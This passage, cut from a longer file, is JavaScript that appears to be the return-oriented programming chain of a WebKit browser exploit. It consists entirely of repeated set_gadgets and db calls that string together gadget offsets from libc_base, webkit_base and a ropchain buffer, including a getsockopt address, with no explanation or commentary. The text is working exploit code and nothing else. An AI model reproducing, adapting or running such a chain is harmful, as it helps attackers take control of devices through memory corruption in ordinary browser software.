libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967080, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([200, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967088, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([192, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967096, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([184, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967104, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([176, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967112, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([168, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([4294967280, 4294967295]); 
set_gadgets([
webkit_base+5202439, 
libc_base+792472, 
getsockopt_addr,
webkit_base+2997875, 
libc_base+793877 
]);
db([4294967192, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([48, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+471355, 
libc_base+793877 
]);
db([32, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([128, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+194520, 
webkit_base+7438103, 
libc_base+811575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+194592, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+194656, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+792472 
]);
db([20, 0]); 
set_gadget(libc_base+793877,); 
db([4294967292, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+793877, 
ropchain+194784, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967292, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+194888, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([24, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+194992, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+195008, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+195152, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+195120, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+195136, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([46, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([41, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+195328, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+195432, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+195448, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+195600, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+195632, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+195616, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+195584, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+195728, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+195712, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+195832, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+197904, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967256, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+195968, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+195984, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+195952, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+196088, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+196136, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+196104, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+196248, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+196240, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+196264, 
ropchain+196712, 
libc_base+50775, 
libc_base+793877, 
ropchain+196320, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+196488, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+196520, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+196504, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+196472, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+196592, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+196608, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+196704, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+196688, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+196752, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967292, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+196856, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+196872, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+197024, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+197056, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+197040, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+197008, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+197216, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+197184, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+197168, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([32, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+197344, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+197360, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+197328, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+197456, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+197472, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+197584, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+197568, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+197672, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+197656, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+197768, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+197784, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+197896, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+197880, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+105267, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+10235455, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+785193, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+811575, 
libc_base+471355, 
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967080, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([200, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967088, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([192, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967096, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([184, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967104, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([176, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967112, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([168, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([4294967280, 4294967295]); 
set_gadgets([
webkit_base+5202439, 
libc_base+792472, 
getsockopt_addr,
webkit_base+2997875, 
libc_base+793877 
]);
db([4294967192, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([48, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+471355, 
libc_base+793877 
]);
db([32, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([128, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+199224, 
webkit_base+7438103, 
libc_base+811575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+199296, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+199360, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([40, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+199512, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+199528, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+199632, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+199616, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+50775, 
libc_base+793877, 
ropchain+199720, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967264, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+199792, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967256, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+793877, 
ropchain+199864, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([12, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([8, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+200008, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([1, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+200160, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+200176, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+200144, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877, 
ropchain+200280, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+200296, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([8, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+200464, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([1, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+200616, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+200632, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+200600, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877, 
ropchain+200776, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+200744, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([4294967295, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+582033, 
libc_base+793877, 
ropchain+200832, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+200888, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+5202439, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+792472 
]);
db([4, 0]); 
set_gadget(libc_base+788575,); 
db([4, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+201128, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+201096, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([32, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+201232, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+201216, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+201312, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967256, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+201416, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+201432, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+201536, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+201520, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+201592, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+954100, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+201680, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([41, 0]); 
set_gadget(libc_base+788575,); 
db([41, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+201808, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+201792, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+201888, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967256, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+201992, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+202008, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+202112, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+202096, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+202168, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+202280, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([61, 0]); 
set_gadget(libc_base+788575,); 
db([61, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+202408, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+202392, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+202488, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967256, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+202592, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+202608, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+202712, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+202696, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+202768, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+202880, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+203008, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+202992, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+203088, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967256, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+203192, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+203208, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+203352, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+203320, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+203336, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+203424, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+203480, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([12, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([8, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+203656, 
webkit_base+7438103, 
webkit_base+3750700 
]);
